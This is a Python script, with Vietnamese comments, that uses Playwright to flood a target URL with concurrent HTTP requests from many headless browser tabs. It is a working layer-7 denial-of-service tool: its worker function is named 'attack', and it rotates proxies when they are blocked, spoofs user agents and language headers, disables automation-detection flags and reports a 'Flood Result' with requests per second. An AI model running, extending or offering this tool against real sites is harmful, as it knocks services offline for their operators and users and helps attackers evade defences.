import asyncio
import random
import time
import os
from playwright.async_api import async_playwright

TARGET_URL = os.getenv("TARGET_URL", "https://example.com/")
DURATION = int(os.getenv("DURATION", "20"))   # giây
CONCURRENCY = int(os.getenv("CONCURRENCY", "30"))  # số tab song song
REQ_PER_LOOP = int(os.getenv("REQ_PER_LOOP", "5"))  # số request song song mỗi vòng/tab
PROXY_FILE = os.getenv("PROXY_FILE", "proxy.txt")  # file chứa danh sách proxy
MAX_FAILURES = int(os.getenv("MAX_FAILURES", "5"))  # số lần thất bại tối đa trước khi đổi proxy
PROXY_COOLDOWN = int(os.getenv("PROXY_COOLDOWN", "60"))  # thời gian chờ trước khi thử lại proxy (giây)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/116.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Firefox/117.0",
]
ACCEPT_LANG = ["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "ja,en;q=0.8"]

success = 0
fail = 0
status_count = {}

class ProxyManager:
    def __init__(self, proxy_file):
        self.proxy_file = proxy_file
        self.proxies = self.load_proxies()
        self.proxy_status = {proxy: {"failures": 0, "last_failure": 0, "blocked": False} for proxy in self.proxies}
        self.current_proxy_index = 0
    
    def load_proxies(self):
        """Load proxies from file"""
        proxies = []
        try:
            with open(self.proxy_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        proxies.append(line)
            print(f"Loaded {len(proxies)} proxies from {self.proxy_file}")
            return proxies
        except FileNotFoundError:
            print(f"Proxy file {self.proxy_file} not found. Running without proxies.")
            return []
        except Exception as e:
            print(f"Error loading proxies: {e}")
            return []
    
    def get_next_proxy(self):
        """Get next available proxy"""
        if not self.proxies:
            return None
        
        # Try to find a proxy that's not blocked
        for _ in range(len(self.proxies)):
            proxy = self.proxies[self.current_proxy_index]
            self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
            
            proxy_info = self.proxy_status[proxy]
            
            # Check if proxy is blocked or in cooldown
            current_time = time.time()
            if (not proxy_info["blocked"] and 
                (current_time - proxy_info["last_failure"] > PROXY_COOLDOWN or 
                 proxy_info["failures"] < MAX_FAILURES)):
                return proxy
        
        # If all proxies are blocked, return a random one
        return random.choice(self.proxies)
    
    def mark_proxy_failure(self, proxy):
        """Mark a proxy as failed"""
        if proxy and proxy in self.proxy_status:
            self.proxy_status[proxy]["failures"] += 1
            self.proxy_status[proxy]["last_failure"] = time.time()
            
            # Block proxy if it failed too many times
            if self.proxy_status[proxy]["failures"] >= MAX_FAILURES:
                self.proxy_status[proxy]["blocked"] = True
                print(f"Proxy {proxy} blocked due to too many failures")
    
    def mark_proxy_success(self, proxy):
        """Mark a proxy as successful (reset failure count)"""
        if proxy and proxy in self.proxy_status:
            self.proxy_status[proxy]["failures"] = 0
            self.proxy_status[proxy]["last_failure"] = 0
    
    def get_proxy_stats(self):
        """Get statistics about proxy status"""
        total = len(self.proxies)
        blocked = sum(1 for proxy in self.proxies if self.proxy_status[proxy]["blocked"])
        available = total - blocked
        
        return {
            "total": total,
            "blocked": blocked,
            "available": available
        }

async def attack(playwright, worker_id, proxy_manager):
    global success, fail, status_count

    ua = random.choice(USER_AGENTS)
    lang = random.choice(ACCEPT_LANG)
    
    # Get initial proxy
    proxy = proxy_manager.get_next_proxy()
    
    browser_args = [
        "--disable-web-security",
        "--disable-features=IsolateOrigins,site-per-process",
        "--disable-blink-features=AutomationControlled",
        "--no-sandbox",
        "--disable-dev-shm-usage"
    ]
    
    # Launch browser with or without proxy
    if proxy:
        browser = await playwright.chromium.launch(
            headless=True,
            proxy={
                "server": proxy
            },
            args=browser_args
        )
        print(f"Worker {worker_id} using proxy: {proxy}")
    else:
        browser = await playwright.chromium.launch(
            headless=True,
            args=browser_args
        )
        print(f"Worker {worker_id} running without proxy")
    
    context = await browser.new_context(
        user_agent=ua,
        extra_http_headers={"Accept-Language": lang}
    )

    start = time.time()
    consecutive_failures = 0
    
    while time.time() - start < DURATION:
        try:
            tasks = []
            for _ in range(REQ_PER_LOOP):
                tasks.append(context.request.get(TARGET_URL, timeout=10000))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)

            batch_success = 0
            batch_fail = 0

            for res in results:
                if isinstance(res, Exception):
                    fail += 1
                    batch_fail += 1
                    status_count["exception"] = status_count.get("exception", 0) + 1
                else:
                    if res.ok:
                        success += 1
                        batch_success += 1
                        status_count[res.status] = status_count.get(res.status, 0) + 1
                    else:
                        fail += 1
                        batch_fail += 1
                        status_count[res.status] = status_count.get(res.status, 0) + 1
            
            # Check if we need to rotate proxy
            if proxy:
                if batch_fail > batch_success and batch_fail > REQ_PER_LOOP * 0.8:  # 80% of requests failed
                    consecutive_failures += 1
                    proxy_manager.mark_proxy_failure(proxy)
                    
                    # If too many consecutive failures, rotate proxy
                    if consecutive_failures >= 2:
                        print(f"Worker {worker_id}: Too many failures with proxy {proxy}, rotating...")
                        
                        # Close current browser and context
                        await context.close()
                        await browser.close()
                        
                        # Get new proxy
                        new_proxy = proxy_manager.get_next_proxy()
                        if new_proxy != proxy:
                            proxy = new_proxy
                            print(f"Worker {worker_id} switched to new proxy: {proxy}")
                            
                            # Launch new browser with new proxy
                            browser = await playwright.chromium.launch(
                                headless=True,
                                proxy={
                                    "server": proxy
                                },
                                args=browser_args
                            )
                            context = await browser.new_context(
                                user_agent=ua,
                                extra_http_headers={"Accept-Language": lang}
                            )
                        
                        consecutive_failures = 0
                else:
                    # If batch was successful, mark proxy as working
                    proxy_manager.mark_proxy_success(proxy)
                    consecutive_failures = 0
            
        except Exception as e:
            print(f"Worker {worker_id}: Error in batch: {e}")
            if proxy:
                proxy_manager.mark_proxy_failure(proxy)

    await browser.close()

async def main():
    # Initialize proxy manager
    proxy_manager = ProxyManager(PROXY_FILE)
    
    # Print proxy statistics
    stats = proxy_manager.get_proxy_stats()
    print(f"Proxy statistics: {stats['total']} total, {stats['available']} available, {stats['blocked']} blocked")
    
    async with async_playwright() as p:
        tasks = [attack(p, i, proxy_manager) for i in range(CONCURRENCY)]
        await asyncio.gather(*tasks)

    total = success + fail
    print(f"\n=== Flood Result ===")
    print(f"Total requests: {total}")
    print(f"Success (2xx): {success}")
    print(f"Fail/Blocked: {fail}")
    print(f"RPS ~ {total / DURATION:.2f}")
    print("Status breakdown:", status_count)
    
    # Print final proxy statistics
    stats = proxy_manager.get_proxy_stats()
    print(f"Final proxy statistics: {stats['total']} total, {stats['available']} available, {stats['blocked']} blocked")

if __name__ == "__main__":
    asyncio.run(main())
